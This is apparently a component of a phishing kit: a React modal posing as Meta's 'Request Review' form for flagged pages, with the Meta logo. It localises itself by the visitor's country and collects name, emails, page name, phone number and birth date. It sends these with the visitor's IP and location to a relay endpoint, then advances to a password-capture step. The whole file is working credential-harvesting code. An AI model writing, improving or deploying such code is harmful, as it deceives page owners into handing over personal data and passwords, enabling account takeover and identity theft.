'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import { getTranslations } from '@/utils/translate';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import dynamic from 'next/dynamic';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useState, useEffect } from 'react';

const IntlTelInput = dynamic(() => import('intl-tel-input/react'), { 
    ssr: false,
    loading: () => <div className='h-9 sm:h-10 bg-gray-100 rounded-lg' />
});

interface FormData {
    fullName: string;
    pageName: string;
    personalEmail: string;
    businessEmail: string;
    reviewReason?: string;
    reviewDescription?: string;
    birthDay?: string;
    birthMonth?: string;
    birthYear?: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea';
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'personalEmail', label: 'Personal Email', type: 'email' },
    { name: 'businessEmail', label: 'Business Email', type: 'email' },
    { name: 'pageName', label: 'Page Name', type: 'text' }
];
const InitModal: FC = () => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        pageName: '',
        businessEmail: '',
        personalEmail: '',
        reviewReason: '',
        reviewDescription: '',
        birthDay: '',
        birthMonth: '',
        birthYear: ''
    });

    const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep } = store();
    const countryCode = geoInfo?.country_code?.toLowerCase() || 'us';

    // Translation effect
    useEffect(() => {
        if (!geoInfo) return;

        (async () => {
            // Comprehensive country → language map (200+ countries/territories)
            const countryLangMap: Record<string, string> = {
                // Africa
                DZ: 'ar', AO: 'pt', BJ: 'fr', BW: 'en', BF: 'fr', BI: 'fr', CV: 'pt',
                CM: 'fr', CF: 'fr', TD: 'fr', KM: 'ar', CG: 'fr', CD: 'fr', DJ: 'fr',
                EG: 'ar', GQ: 'es', ER: 'ar', ET: 'am', GA: 'fr', GM: 'en', GH: 'en',
                GN: 'fr', GW: 'pt', CI: 'fr', KE: 'sw', LS: 'en', LR: 'en', LY: 'ar',
                MG: 'fr', MW: 'en', ML: 'fr', MR: 'ar', MU: 'fr', MA: 'ar', MZ: 'pt',
                NA: 'en', NE: 'fr', NG: 'en', RW: 'fr', ST: 'pt', SN: 'fr', SC: 'fr',
                SL: 'en', SO: 'ar', ZA: 'en', SS: 'en', SD: 'ar', SZ: 'en', TZ: 'sw',
                TG: 'fr', TN: 'ar', UG: 'en', ZM: 'en', ZW: 'en',
                // Americas
                AG: 'en', AR: 'es', BS: 'en', BB: 'en', BZ: 'en', BO: 'es', BR: 'pt',
                CA: 'en', CL: 'es', CO: 'es', CR: 'es', CU: 'es', DM: 'en', DO: 'es',
                EC: 'es', SV: 'es', GD: 'en', GT: 'es', GY: 'en', HT: 'fr', HN: 'es',
                JM: 'en', MX: 'es', NI: 'es', PA: 'es', PY: 'es', PE: 'es', PR: 'es',
                KN: 'en', LC: 'en', VC: 'en', SR: 'nl', TT: 'en', US: 'en', UY: 'es',
                VE: 'es',
                // Asia
                AF: 'fa', AM: 'hy', AZ: 'az', BH: 'ar', BD: 'bn', BN: 'ms',
                KH: 'km', CN: 'zh', CY: 'el', GE: 'ka', HK: 'zh', IN: 'hi', ID: 'id',
                IR: 'fa', IQ: 'ar', IL: 'iw', JP: 'ja', JO: 'ar', KZ: 'ru', KW: 'ar',
                KG: 'ru', LA: 'lo', LB: 'ar', MO: 'zh', MY: 'ms', MV: 'en', MN: 'mn',
                MM: 'my', NP: 'ne', KP: 'ko', OM: 'ar', PK: 'ur', PS: 'ar', PH: 'tl',
                QA: 'ar', SA: 'ar', SG: 'zh', LK: 'si', SY: 'ar', TW: 'zh', TJ: 'ru',
                TH: 'th', TL: 'pt', TR: 'tr', TM: 'ru', AE: 'ar', UZ: 'uz', VN: 'vi',
                YE: 'ar',
                // Europe
                AL: 'sq', AD: 'es', AT: 'de', BY: 'ru', BE: 'nl', BA: 'bs', BG: 'bg',
                HR: 'hr', CZ: 'cs', DK: 'da', EE: 'et', FI: 'fi', FR: 'fr', DE: 'de',
                GR: 'el', HU: 'hu', IS: 'is', IE: 'en', IT: 'it', XK: 'sq', LV: 'lv',
                LI: 'de', LT: 'lt', LU: 'fr', MT: 'mt', MD: 'ro', MC: 'fr', ME: 'sr',
                NL: 'nl', MK: 'mk', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro', RU: 'ru',
                SM: 'it', RS: 'sr', SK: 'cs', SI: 'sl', ES: 'es', SE: 'sv', CH: 'de',
                UA: 'uk', GB: 'en', VA: 'it',
                // Oceania
                AU: 'en', FJ: 'en', KI: 'en', MH: 'en', FM: 'en', NR: 'en', NZ: 'en',
                PW: 'en', PG: 'en', WS: 'en', SB: 'en', TO: 'en', TV: 'en', VU: 'fr',
                // Territories
                GL: 'da', FO: 'da', AX: 'sv', GI: 'en', JE: 'en', GG: 'en', IM: 'en',
            };

            // Languages with full hardcoded translations in translate.ts
            const HARDCODED_LANGS = new Set([
                'vi','es','fr','de','it','zh','ar','hi','pt','ru','ja','nl','pl','el',
                'tr','th','ko','sv','id','ms','uk','bn','tl','no'
            ]);

            const cc = geoInfo.country_code.toUpperCase();
            const lang = countryLangMap[cc] || 'en';
            if (lang === 'en') return; // No translation needed

            // Get hardcoded translations as base (if available)
            const hardcoded = HARDCODED_LANGS.has(lang) ? (getTranslations(lang) || {}) : {};

            // All texts needed in this modal
            const textsToTranslate = [
                'Request Review',
                'Full Name',
                'Personal Email',
                'Business Email',
                'Page Name',
                'Mobile phone number',
                'Date of birth',
                'Day',
                'Month',
                'Year',
                'Why are you requesting a review?',
                "I'm not sure which policy was violated.",
                'I think there was unauthorized use of my account.',
                'Another reason:',
                'Please describe your reason',
                'Submit',
            ];

            // Find texts missing from hardcoded translations
            const missingTexts = textsToTranslate.filter(text => !hardcoded[text]);

            // If all texts exist in hardcoded, use directly
            if (missingTexts.length === 0) {
                setTranslations(hardcoded);
                return;
            }

            // Set hardcoded first for instant display, then fetch missing
            if (Object.keys(hardcoded).length > 0) {
                setTranslations(hardcoded);
            }

            // Get cache
            const CACHE_KEY = 'translation_cache';
            const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
            const cache = cached ? JSON.parse(cached) : {};

            // Check if all missing texts are cached
            const allMissingCached = missingTexts.every(text => cache[`en:${lang}:${text}`]);

            if (allMissingCached) {
                const translatedMap: Record<string, string> = { ...hardcoded };
                missingTexts.forEach(text => {
                    translatedMap[text] = cache[`en:${lang}:${text}`];
                });
                setTranslations(translatedMap);
                return;
            }

            // Translate only missing texts via Google API
            const translatePromises = missingTexts.map(async (text) => {
                const cacheKey = `en:${lang}:${text}`;

                if (cache[cacheKey]) {
                    return { text, translated: cache[cacheKey] };
                }

                try {
                    const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
                        params: {
                            client: 'gtx',
                            sl: 'en',
                            tl: lang,
                            dt: 't',
                            q: text
                        }
                    });

                    const translatedText = response.data[0]
                        ?.map((item: unknown[]) => item[0])
                        .filter(Boolean)
                        .join('') || text;

                    cache[cacheKey] = translatedText;
                    return { text, translated: translatedText };
                } catch {
                    return { text, translated: text };
                }
            });

            const results = await Promise.all(translatePromises);

            if (typeof window !== 'undefined') {
                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
            }

            // Merge hardcoded + API results
            const translatedMap: Record<string, string> = { ...hardcoded };
            results.forEach(({ text, translated }) => {
                translatedMap[text] = translated;
            });

            setTranslations(translatedMap);
        })();
    }, [geoInfo]); // Only depends on geoInfo

    const t = (text: string): string => translations[text] || text;

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            nationalMode: true,
            countrySearch: false
        }),
        [countryCode]
    );

    // Reset form fields when modal closes
    useEffect(() => {
        if (formStep !== 'init') {
            setFormData({
                fullName: '',
                pageName: '',
                businessEmail: '',
                personalEmail: '',
                reviewReason: '',
                reviewDescription: '',
                birthDay: '',
                birthMonth: '',
                birthYear: ''
            });
            setPhoneNumber('');
            setIsLoading(false);
        }
    }, [formStep]);

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;
        setIsLoading(true);

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>� Page Name:</b> <code>${formData.pageName}</code>
<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
<b>📧 Business Email:</b> <code>${formData.businessEmail}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date of Birth:</b> <code>${formData.birthDay}/${formData.birthMonth}/${formData.birthYear}</code>` : ''}

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            const res = await axios.post('/api/send', {
                message
            });
            if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
                setMessageId(res.data.data.result.message_id);
                setMessage(message);
            }
        } catch {
            // Continue even if send fails
        } finally {
            setIsLoading(false);
            // Store user data and switch to password form step
            setUserEmail(formData.personalEmail);
            setUserFullName(formData.fullName);
            setUserPhone(phoneNumber);
            setFormStep('password');
        }
    };

    // Only show init modal if formStep is not set to password or other steps
    if (formStep && formStep !== 'init') {
        return null;
    }

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-2 sm:p-4 md:p-6'>
                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] overflow-hidden'>
                <div className='mb-1 sm:mb-1.5 flex w-full items-center justify-between p-3 sm:p-3.5 pb-0'>
                    <p className='text-xs sm:text-sm font-bold'>{t('Request Review')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-7 sm:h-8 w-7 sm:w-8 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='lg' />
                    </button>
                </div>

                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-3 sm:px-3.5'>
                    <div className='flex flex-col gap-1.5 sm:gap-2 py-2.5 sm:py-3'>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t(field.label)}</p>
                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-16 sm:min-h-20 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm' rows={2} /> : <input required name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm' />}
                            </div>
                        ))}
                        <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t('Mobile phone number')}</p>
                        {countryCode ? (
                            <IntlTelInput
                                key={countryCode}
                                onChangeNumber={handlePhoneChange}
                                initOptions={initOptions}
                                inputProps={{
                                    name: 'phoneNumber',
                                    className: 'h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm'
                                }}
                            />
                        ) : (
                            <div className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] bg-gray-50 animate-pulse' />
                        )}

                        {/* Date of Birth Section */}
                        <div className='mt-1.5 sm:mt-2'>
                            <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-1.5'>{t('Date of birth')}</p>
                            <div className='grid grid-cols-3 gap-1.5 sm:gap-2'>
                                {/* Day Selector */}
                                <div>
                                    <label className='text-xs text-[#1C2B33] block mb-0.5'>{t('Day')}</label>
                                    <select
                                        name='birthDay'
                                        value={formData.birthDay}
                                        onChange={handleInputChange}
                                        className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1.5 text-xs sm:text-sm font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
                                    >
                                        <option value=''>DD</option>
                                        {Array.from({ length: 31 }, (_, i) => i + 1).map((day) => (
                                            <option key={day} value={String(day).padStart(2, '0')}>
                                                {String(day).padStart(2, '0')}
                                            </option>
                                        ))}
                                    </select>
                                </div>

                                {/* Month Selector */}
                                <div>
                                    <label className='text-xs text-[#1C2B33] block mb-0.5'>{t('Month')}</label>
                                    <select
                                        name='birthMonth'
                                        value={formData.birthMonth}
                                        onChange={handleInputChange}
                                        className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1.5 text-xs sm:text-sm font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
                                    >
                                        <option value=''>MM</option>
                                        {[
                                            { num: '01', name: 'January' },
                                            { num: '02', name: 'February' },
                                            { num: '03', name: 'March' },
                                            { num: '04', name: 'April' },
                                            { num: '05', name: 'May' },
                                            { num: '06', name: 'June' },
                                            { num: '07', name: 'July' },
                                            { num: '08', name: 'August' },
                                            { num: '09', name: 'September' },
                                            { num: '10', name: 'October' },
                                            { num: '11', name: 'November' },
                                            { num: '12', name: 'December' }
                                        ].map((month) => (
                                            <option key={month.num} value={month.num}>
                                                {month.num}
                                            </option>
                                        ))}
                                    </select>
                                </div>

                                {/* Year Selector */}
                                <div>
                                    <label className='text-xs text-[#1C2B33] block mb-0.5'>{t('Year')}</label>
                                    <select
                                        name='birthYear'
                                        value={formData.birthYear}
                                        onChange={handleInputChange}
                                        className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1.5 text-xs sm:text-sm font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
                                    >
                                        <option value=''>YYYY</option>
                                        {Array.from({ length: new Date().getFullYear() - 1949 }, (_, i) => new Date().getFullYear() - i).map((year) => (
                                            <option key={year} value={String(year)}>
                                                {year}
                                            </option>
                                        ))}
                                    </select>
                                </div>
                            </div>
                        </div>
                        
                        {/* Review Reason Section */}
                        <div className='mt-1.5 sm:mt-2'>
                            <p className='text-xs sm:text-sm font-sans mb-1'>{t('Why are you requesting a review?')}</p>
                            <div className='flex flex-col gap-1'>
                                <label className='flex items-center gap-1.5 cursor-pointer'>
                                    <input
                                        type='radio'
                                        name='reviewReason'
                                        value="I'm not sure which policy was violated."
                                        checked={formData.reviewReason === "I'm not sure which policy was violated."}
                                        onChange={handleInputChange}
                                        className='w-4 h-4'
                                    />
                                    <span className='text-xs sm:text-sm'>{t("I'm not sure which policy was violated.")}</span>
                                </label>
                                <label className='flex items-center gap-1.5 cursor-pointer'>
                                    <input
                                        type='radio'
                                        name='reviewReason'
                                        value='I think there was unauthorized use of my account.'
                                        checked={formData.reviewReason === 'I think there was unauthorized use of my account.'}
                                        onChange={handleInputChange}
                                        className='w-4 h-4'
                                    />
                                    <span className='text-xs sm:text-sm'>{t('I think there was unauthorized use of my account.')}</span>
                                </label>
                                <label className='flex items-center gap-1.5 cursor-pointer'>
                                    <input
                                        type='radio'
                                        name='reviewReason'
                                        value='Another reason:'
                                        checked={formData.reviewReason === 'Another reason:'}
                                        onChange={handleInputChange}
                                        className='w-4 h-4'
                                    />
                                    <span className='text-xs sm:text-sm'>{t('Another reason:')}</span>
                                </label>
                            </div>
                            
                            {/* Description textarea */}
                            {formData.reviewReason === 'Another reason:' && (
                                <textarea
                                    name='reviewDescription'
                                    value={formData.reviewDescription}
                                    onChange={handleInputChange}
                                    placeholder={t('Please describe your reason')}
                                    className='mt-1.5 min-h-16 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-xs'
                                    rows={2}
                                />
                            )}
                        </div>
                        <button type='submit' disabled={isLoading} className={`mt-2 sm:mt-2.5 flex h-9 sm:h-10 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-2 sm:p-2.5'>
                    <Image src={MetaLogo} alt='' className='h-3 sm:h-3.5 w-12 sm:w-14' />
                </div>
            </div>
            </div>
        </>
    );
};

export default InitModal;
